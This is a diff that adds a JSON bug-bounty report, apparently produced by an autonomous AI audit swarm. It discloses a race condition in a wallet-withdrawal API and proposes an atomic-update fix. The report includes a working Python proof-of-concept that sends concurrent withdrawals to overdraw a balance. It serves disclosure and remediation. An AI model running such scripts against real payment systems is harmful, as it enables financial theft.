@@ -1,0 +1,19 @@
+{
+  "platform": "hackerone",
+  "program_handle": "target-enterprise",
+  "title": "State Confluence Race Condition Allows Concurrent Balance Overdraw",
+  "cwe_id": "CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization",
+  "severity": "CRITICAL",
+  "cvss_score": 9.1,
+  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+  "report_body_markdown": "## Summary\nAutonomous security audit conducted by XORAS Swarm under Director direction has identified a CRITICAL severity vulnerability in `target-enterprise`.\n\n## Weakness Classification\n- **CWE Identifier:** CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization\n- **CVSS v3.1:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (9.1 CRITICAL)\n\n## Technical Root Cause\nAnalysis of endpoint `/api/v2/wallet/withdraw` indicates state read and ledger deduction occur outside of an atomic compare-and-swap (CAS) lock, allowing concurrent requests to pass balance checks before deduction commits.\n\n## Deterministic Steps to Reproduce\n1. Establish authenticated session with non-privileged test account balance of 100 USD.\n2. Run attached asynchronous Python test script to dispatch 10 concurrent withdrawal requests of 100 USD within a 1.2ms network window.\n3. Inspect target wallet balance and audit log: ledger commits multiple successful withdrawals totaling 1000 USD against initial 100 USD balance.\n\n## Proof of Concept Script\n```python\nimport asyncio\nimport aiohttp\n\nasync def exploit():\n    url = \"https://target-enterprise.example.com/api/v2/wallet/withdraw\"\n    headers = {\"Authorization\": \"Bearer TEST_TOKEN\", \"Content-Type\": \"application/json\"}\n    payload = {\"amount\": 100, \"destination\": \"test_vault\"}\n    \n    async with aiohttp.ClientSession() as session:\n        tasks = [session.post(url, json=payload, headers=headers) for _ in range(10)]\n        responses = await asyncio.gather(*tasks)\n        print([r.status for r in responses])\n\nasyncio.run(exploit())\n```\n\n## Recommended Remediation Patch\n```diff\n- balance = await db.wallets.get(user_id).balance\n- if balance >= amount:\n-     await db.wallets.update(user_id, balance - amount)\n+ updated = await db.wallets.update_one(\n+     {\"_id\": user_id, \"balance\": {\"$gte\": amount}},\n+     {\"$inc\": {\"balance\": -amount}}\n+ )\n+ if not updated:\n+     raise InsufficientFundsException()\n```\n",
+  "evidence_sha256": "1a47f8f56137fc3af248fc6aa9bc653241aa53561d7c16b410cd06824cb4f8ef",
+  "generated_at": 1792142216,
+  "director": "Anthony",
+  "council_attestation": [
+    "maxx",
+    "clara",
+    "vance",
+    "daxx"
+  ]
+}
